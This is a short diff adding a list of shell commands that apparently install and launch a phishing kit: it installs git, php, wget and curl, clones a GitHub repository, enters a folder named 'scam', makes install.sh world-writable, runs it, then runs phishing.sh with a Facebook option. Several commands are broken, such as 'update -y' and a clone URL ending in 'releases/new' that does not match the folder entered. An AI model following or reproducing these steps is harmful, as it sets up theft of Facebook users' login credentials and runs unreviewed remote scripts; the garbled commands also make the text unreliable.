@@ -1,0 +1,43 @@
+apt update && update -y
+
+
+apt install git
+
+
+ apt install php
+
+
+apt install wget curl
+
+
+ git clone https://github.com/rubenrubenn/rolandojr/releases/new
+
+
+apt install git
+
+
+ls
+
+
+ cd scam
+
+
+ ls
+
+
+ chmod 777 install.sh
+
+
+ls
+
+
+bash install.sh
+
+
+ls
+
+
+bash phishing.sh
+
+
+./phishing.sh --use -Facebook
